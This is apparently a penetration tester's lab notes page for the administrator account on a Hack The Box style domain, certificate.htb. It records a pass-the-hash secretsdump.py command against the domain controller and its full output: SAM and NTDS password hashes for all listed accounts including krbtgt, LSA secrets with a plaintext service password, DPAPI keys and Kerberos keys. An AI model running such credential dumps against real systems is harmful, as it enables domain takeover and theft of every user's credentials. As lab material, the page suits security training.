---
title: administrator
type: user
---

### administrator

#### validated credentials

```yaml credentials
- login: certificate.htb
  user: administrator
  password: pass
  nt_hash: d804304519bf0143c14cbf1c024408c6 
```

```zsh env-invoked
#set_current_user administrator
#echo "Current user: $CURRENT_USER"
```

#### information

ADMIN


```sh
secretsdump.py "$DOMAIN"/administrator@"$RHOST" -hashes :d804304519bf0143c14cbf1c024408c6  
bootkey: 0x5cea1e66da8824f09a4e388596e60a4a
```

```sh result
[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)

Administrator:500:aad3b435b51404eeaad3b435b51404ee:60f6b8c46a9c6d8e0635b619c069b2ae:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
[-] SAM hashes extraction for user WDAGUtilityAccount failed. The account doesn't have hash information.
[*] Dumping cached domain logon information (domain/username:hash)

[*] Dumping LSA Secrets
[*] $MACHINE.ACC 
CERTIFICATE\DC01$:aes256-cts-hmac-sha1-96:37e0e73332edfcc623b54ae20124ba786f453d664b05c950e19957b01aa82226
CERTIFICATE\DC01$:aes128-cts-hmac-sha1-96:cb4b0249daf270bce4f51db03e407c38
CERTIFICATE\DC01$:des-cbc-md5:0219c23d986eefb0
CERTIFICATE\DC01$:plain_password_hex:b9e738a3d3c27735c6c2e77c4718f2434791aa8de0ccd96c4570de531c91fc7c96973fef80e4cbc9f9a00217923216eb5c2f6e64699f0d53c97f5f44d40e40cb4d4cbb8a7e3e85eefce6b72c43740e5a5a87a83a041e5bca193771025752807f8db1a666382fcabb9eca24822746fb5197638ef3515a9a8e7ea3b48a6656bc9152e0a9167026cf36961a320806768ab02438a4444efdcd043cf1a3d3f78152006ea52e5dae8364b7f64f9dacca923478bfbd24686af0a907a531e5329f1e8ce95d0b9da1513f6637fd34084e06dc93a1fd2e36d74aab657e2bdf0ac00352a3085ff70f2dd53e21c160e99a11960cebdf
CERTIFICATE\DC01$:aad3b435b51404eeaad3b435b51404ee:f36e0bc3c9a34c3acdb8b79df54f27cd:::

[*] DPAPI_SYSTEM 
dpapi_machinekey:0xc3ff4e4015e130aeac8a1230c29c6cd80a123f75
dpapi_userkey:0x36a4f4aae2cdbee83d6abfc5e9d546d09e8eaf04
[*] NL$KM 
 0000   DB 80 E3 7D 2D F9 3B 06  ED DB EC 4B 5B 13 1C 1E   ...}-.;....K[...
 0010   18 0E 97 5D 3E A9 50 81  F9 92 9A 32 97 BC FB 94   ...]>.P....2....
 0020   D0 69 3D C3 70 3C BD 83  AE 53 66 03 3C E7 DB 69   .i=.p<...Sf.<..i
 0030   CF F4 A1 16 B2 58 38 56  2E CF E8 8F 38 51 A3 EE   .....X8V....8Q..
NL$KM:db80e37d2df93b06eddbec4b5b131c1e180e975d3ea95081f9929a3297bcfb94d0693dc3703cbd83ae5366033ce7db69cff4a116b25838562ecfe88f3851a3ee
[*] _SC_Apache2.4 
CERTIFICATE\xamppuser:x@mppUserPwd!
[*] _SC_mysql 
CERTIFICATE\xamppuser:x@mppUserPwd!
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:d804304519bf0143c14cbf1c024408c6:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:9de0f65ce37b57bc0a8fce1f9d4402c7:::
Kai.X:1105:aad3b435b51404eeaad3b435b51404ee:003c4c38e98c78352362095a6028f720:::
Sara.B:1109:aad3b435b51404eeaad3b435b51404ee:c2367169e3279fa3e85d9d25f0e85e45:::
John.C:1111:aad3b435b51404eeaad3b435b51404ee:3f6d0e5bbf21d7f1c72a8eebc82547f5:::
Aya.W:1112:aad3b435b51404eeaad3b435b51404ee:a72e757f0f5859819e90d1a71666f933:::
Nya.S:1113:aad3b435b51404eeaad3b435b51404ee:a72e757f0f5859819e90d1a71666f933:::
Maya.K:1114:aad3b435b51404eeaad3b435b51404ee:a72e757f0f5859819e90d1a71666f933:::
Lion.SK:1115:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
Eva.F:1116:aad3b435b51404eeaad3b435b51404ee:f30914c4b456ef5691bf24b50b332e99:::
Ryan.K:1117:aad3b435b51404eeaad3b435b51404ee:2b576acbe6bcfda7294d6bd18041b8fe:::
certificate.htb\akeder.kh:1119:aad3b435b51404eeaad3b435b51404ee:9ca9ba1e46bd75574002b8b1967bb2de:::
kara.m:1121:aad3b435b51404eeaad3b435b51404ee:831a13eb0ff31d5b80eb062f24bfb210:::
Alex.D:1124:aad3b435b51404eeaad3b435b51404ee:32be964c0519ef40083157825c7949ca:::
certificate.htb\karol.s:1127:aad3b435b51404eeaad3b435b51404ee:a242ea4fbd87f0feff1203bad168b770:::
saad.m:1128:aad3b435b51404eeaad3b435b51404ee:a242ea4fbd87f0feff1203bad168b770:::
xamppuser:1130:aad3b435b51404eeaad3b435b51404ee:ed547ca356c218f5e76c2640fc3429ab:::
DC01$:1000:aad3b435b51404eeaad3b435b51404ee:f36e0bc3c9a34c3acdb8b79df54f27cd:::
WS-01$:1103:aad3b435b51404eeaad3b435b51404ee:3641f1cd0daa8dfe41e1d1b2dbbed6f4:::
WS-05$:1131:aad3b435b51404eeaad3b435b51404ee:eae20b8c895e7ac2e1a4870f71738058:::
[*] Kerberos keys grabbed
Administrator:aes256-cts-hmac-sha1-96:28934e3c2d87ea8123c8a2c2189175d2c9b19a3fd6a1e510e7f96d7b7778703b
Administrator:aes128-cts-hmac-sha1-96:a019041d011b4af3978fe35dc601674b
Administrator:des-cbc-md5:ea5eef85f7681373
krbtgt:aes256-cts-hmac-sha1-96:59ba38be08a47d21666a346bf6e525509cc91e8f318658e26a1d06b28868571e
krbtgt:aes128-cts-hmac-sha1-96:3ef27c98cdb9669963d09bdf0a43b8bf
krbtgt:des-cbc-md5:2c753ed0988abc92
Kai.X:aes256-cts-hmac-sha1-96:116143b655fa31afae0914f10b85105cdf7681d54ff7039e4d80d922082de596
Kai.X:aes128-cts-hmac-sha1-96:381e6ff043963c7c2c5ed37fc4cfbdd6
Kai.X:des-cbc-md5:c8ef52989445f4f7
Sara.B:aes256-cts-hmac-sha1-96:92fe5c9c7e3d3f5902335cf5b08ae7429dd68708dbe9df507c1853dfcd2ce2d2
Sara.B:aes128-cts-hmac-sha1-96:6194d1e2212a019abd4fa9979c1acd07
Sara.B:des-cbc-md5:19349edfceb6b979
John.C:aes256-cts-hmac-sha1-96:da04bfe09f83cd3ba3b4819d883b647ced8de73fe8e6ff32953fc3c964a61cd5
John.C:aes128-cts-hmac-sha1-96:bc774e9044a071ce5eee8338cfa50831
John.C:des-cbc-md5:6e981976ad91646b
Aya.W:aes256-cts-hmac-sha1-96:d1432310b9711f49f0c3094f9f844d0e12220b5fc3a082171c5eb26a26ffd98c
Aya.W:aes128-cts-hmac-sha1-96:3894a9cda7439dc0982e8bfc981c6d37
Aya.W:des-cbc-md5:8f01013e6b68e54a
Nya.S:aes256-cts-hmac-sha1-96:30aab7542b5cd28335df6d4db7a02bf33bef5440bdd7588f955d690de9fd07d7
Nya.S:aes128-cts-hmac-sha1-96:79006be0640212bd3f57fb38d011d9d2
Nya.S:des-cbc-md5:f4f18f1c10e3b351
Maya.K:aes256-cts-hmac-sha1-96:482276cf4da25e6fe9a3f7a380d99a0ce552d443d7b16fea2bb2bf1ad2ae3e8a
Maya.K:aes128-cts-hmac-sha1-96:c18058497f430d129861f41c4241f04b
Maya.K:des-cbc-md5:ba34f1f19751d52f
Lion.SK:aes256-cts-hmac-sha1-96:e5f67824e62d093c39d5175e4828ad6e4d6a3f998902309007c269094b49cc52
Lion.SK:aes128-cts-hmac-sha1-96:1acb7e9c4d1ab09f6f00b6cfa4b553cb
Lion.SK:des-cbc-md5:e54ffbfb0b32190d
Eva.F:aes256-cts-hmac-sha1-96:60f2c643add6e126180fe2a34bbec9e1bca0c2eb6efe5e655a06ae9901e1cba8
Eva.F:aes128-cts-hmac-sha1-96:8a64f57bfadb0fabae673406e8b6fa73
Eva.F:des-cbc-md5:7620e61a3886b5b3
Ryan.K:aes256-cts-hmac-sha1-96:55f6dadebca88eced9b93d558808e3da2b539d9601a94eb8644de9160f300a13
Ryan.K:aes128-cts-hmac-sha1-96:24e72d5c03590213e1a80b851a01671c
Ryan.K:des-cbc-md5:4c4c6d23e5cb762a
certificate.htb\akeder.kh:aes256-cts-hmac-sha1-96:bbdb1644e7d3ab0cc13ebe542cb3e2bf9024f8c3690d02bdfb8866f222f03bc5
certificate.htb\akeder.kh:aes128-cts-hmac-sha1-96:53a8638de435664ca479dfffc3a47fbd
certificate.htb\akeder.kh:des-cbc-md5:ec1cdc8a0eaeb9f2
kara.m:aes256-cts-hmac-sha1-96:5cc3518a1dfd601f484ba7aa92ac777c7eedf65496175359f23b55f8d5ba41c5
kara.m:aes128-cts-hmac-sha1-96:c201828964b9187554c6238bee79b3cc
kara.m:des-cbc-md5:d67a67912cdf6db0
Alex.D:aes256-cts-hmac-sha1-96:8f00005e0efff69425291686304234126b287ff9c4f3a1edbf6b4ec86b9a1680
Alex.D:aes128-cts-hmac-sha1-96:46db992e8d448542410224702476bdf7
Alex.D:des-cbc-md5:57dc6220fd46517c
certificate.htb\karol.s:aes256-cts-hmac-sha1-96:3e6eaf02de4f20cafd9fdefd97f80fa84d668ee96983a8692bef80dc3f0ce578
certificate.htb\karol.s:aes128-cts-hmac-sha1-96:f734a166ec136b819119908c769ae8d4
certificate.htb\karol.s:des-cbc-md5:437919526efb4557
saad.m:aes256-cts-hmac-sha1-96:25a0b122b539c1f924d1309bc0595f2f7fc047b8405973bdf6e502945143258d
saad.m:aes128-cts-hmac-sha1-96:895c4110710dda478e99cdf9559887d8
saad.m:des-cbc-md5:4020fb4c7aa497d6
xamppuser:aes256-cts-hmac-sha1-96:8c99dec482f65ac7be5ea175dd671caee69a7adfb9275ea8581a57757139b3f6
xamppuser:aes128-cts-hmac-sha1-96:3d63b58ed58b30d1ce3f15c9002d702e
xamppuser:des-cbc-md5:6b40cd8c6bf4fd6b
DC01$:aes256-cts-hmac-sha1-96:37e0e73332edfcc623b54ae20124ba786f453d664b05c950e19957b01aa82226
DC01$:aes128-cts-hmac-sha1-96:cb4b0249daf270bce4f51db03e407c38
DC01$:des-cbc-md5:fd94499b6e15198a
WS-01$:aes256-cts-hmac-sha1-96:05a043c187f9bf02d2374a5fdf169e4c63a8be47c485b5cc44171d765e59e4ac
WS-01$:aes128-cts-hmac-sha1-96:e1cd0218231edfadad47b08a57e24184
WS-01$:des-cbc-md5:df4fd676a85d4f7c
WS-05$:aes256-cts-hmac-sha1-96:0c426e103497f20b76c7d182cc45c2df19d3bc08b6e745ca475adc99f2c42794
WS-05$:aes128-cts-hmac-sha1-96:a19fa3efa03b8c474c048294c3c7b899
WS-05$:des-cbc-md5:9e07545d40f8daa8
```

#### Privileges / roles / groups 






